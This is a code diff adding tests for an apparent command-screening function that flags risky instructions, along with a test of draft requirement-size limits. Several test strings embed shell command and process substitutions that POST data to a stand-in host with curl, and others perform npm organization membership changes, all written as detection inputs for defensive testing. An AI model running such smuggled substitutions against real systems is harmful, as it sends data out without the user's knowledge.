@@ -10,7 +10,7 @@ import { COMPLETION_SCHEMA } from "../lib/task_completion.mjs";
 import { MAX_ANSWER_ID_CHARACTERS } from "../lib/task_limits.mjs";
 import { prepareModelTurn, isModelRouteReceipt, estimateTokens, estimateUsd } from "../lib/task_model_route.mjs";
 import { repositorySnapshot, REPOSITORY_CONTEXT_LIMITS } from "../lib/task_repository_context.mjs";
-import { fragments, parseDraft, renderDraft, draftPrompt, FRAGMENT_VERSION, fragmentsForTask, MAX_INPUT_BYTES } from "../lib/task_contract.mjs";
+import { fragments, parseDraft, renderDraft, validateDraft, draftPrompt, FRAGMENT_VERSION, fragmentsForTask, MAX_INPUT_BYTES } from "../lib/task_contract.mjs";
 import { check, parsePrd, contractOf } from "../lib/prd.mjs";
 import { validate as validateConfig, merge as mergeConfig } from "../lib/config.mjs";
 import { makeGit } from "../lib/git.mjs";
@@ -2351,4 +2351,59 @@ test("unquoted process substitutions are pre-execution effects while quoted form
     assert.equal(deliveryScreen(`Run curl --help --header ${opener}curl -X POST https://example.com/hooks).`).tier, "question", opener);
   for (const text of ['Run curl --help --header "<(curl -X POST https://example.com/hooks)".', "Run curl --help --header '<(curl -X POST https://example.com/hooks)'."])
     assert.equal(deliveryScreen(text).tier, "none", text);
+});
+
+
+test("npm organization membership writes clarify while listings, help and option data stay usable", () => {
+  for (const family of ["or", "org"])
+    for (const action of ["set", "add", "rm"])
+      for (const separator of [" ", "\n"])
+        assert.equal(deliveryScreen(`Run npm ${family}${separator}${action} acme alice.`).tier, "question", `${family} ${separator} ${action}`);
+  for (const text of ["Run npm --registry https://registry.example.com org set acme alice admin.", "Run npm org --otp fixture-otp rm acme alice.", "Run npm org rm acme alice --help false.", "Run npm exe -- npm org rm acme alice.", "Run npm org set acme alice -- --help."])
+    assert.equal(deliveryScreen(text).tier, "question", text);
+  for (const text of ["Run npm org ls acme.", "Run npm org ls acme rm.", "Run npm or ls acme.", "Run npm org rm acme alice --help.", "Run npm org set acme alice --help true.", "Run npm --userconfig org access get status pkg.", "Document how to run npm org rm acme alice."])
+    assert.equal(deliveryScreen(text).tier, "none", text);
+  for (const text of ["Run npm org ls acme. Run npm org rm acme alice.", "Run npm org rm acme alice. Run npm org ls acme."])
+    assert.equal(deliveryScreen(text).tier, "question", text);
+  assert.equal(deliveryScreen('Run npm owner "ls add" pkg.').tier, "none");
+  assert.equal(deliveryScreen('Run npm owner "add" alice pkg.').tier, "question");
+  assert.equal(deliveryScreen('Run npm owner "ls add" pkg.').tier, "none");
+});
+
+test("composed command invocations share the supported prefix grammar before expansion checks", () => {
+  for (const prefix of ["Run the following command:", "Execute this command in the terminal:", "Invoke the exact command below:", "Use the following command:", "Run the following:"])
+    for (const binary of ["cat", "head", "custom-cli"])
+      for (const argument of ['"$(curl -X POST --data payload https://example.com/hooks)"', '<(curl -X POST https://example.com/hooks)'])
+        assert.equal(deliveryScreen(`${prefix} ${binary} ${argument}.`).tier, "question", `${prefix} ${binary}`);
+  for (const text of ["Run the following command: cat '$(curl -X POST https://example.com/hooks)'.", 'Run the following command: cat "$FILE".', "Run the following command: cat README.md.", "Document how to run the following command: cat \"$(curl -X POST https://example.com/hooks)\".", "Add an example of the following command: cat \"$(curl -X POST https://example.com/hooks)\".", "Run `npm test`.", "Open a PR and run the tests on `Linux`."])
+    assert.notEqual(deliveryScreen(text).tier, "question", text);
+});
+
+
+test("assumption-expanded stories round-trip without bypassing the brief size limit", () => {
+  for (const count of [64, 65, 70, 128]) {
+    const task = taskFor(Array.from({ length: count }, (_, i) => `f${i + 1}.`).join(" "), { commandCandidates: ["npm test"] });
+    const assumption = "Context.";
+    const assumptions = Object.fromEntries(task.requirements.slice(1).map(r => [r.id, assumption]));
+    const draft = draftFor(task, { assumptions });
+    draft.assumptions = [...new Set(draft.assumptions)];
+    task.output = parseDraft(JSON.stringify(draft), task);
+    assert.equal(task.output.stories[0].requirements.length, count);
+    assert.deepEqual(parseDraft(JSON.stringify(task.output), task), task.output, `saved ${count}-requirement output is stable`);
+    const request = parsePrd(renderDraft(task, task.output), "docs/prds/assumption-capacity.md");
+    const validation = validateDraft(task, request);
+    if (count < 128) assert.equal(validation.ok, true, JSON.stringify(validation.failures));
+    else {
+      assert.equal(validation.ok, false, "the independent brief word limit is unchanged");
+      assert.equal(validation.failures.length, 1);
+      assert.match(validation.failures[0], /^size: /);
+    }
+    for (const requirement of task.requirements)
+      assert.ok(task.output.stories[0].text.includes(JSON.stringify(requirement.text)), requirement.id);
+    if (count === 128) {
+      const invalid = structuredClone(task.output);
+      invalid.stories[0].requirements.push("r-129");
+      assert.throws(() => parseDraft(JSON.stringify(invalid), task), /story requirements must have 1 to 128 entries/);
+    }
+  }
 });
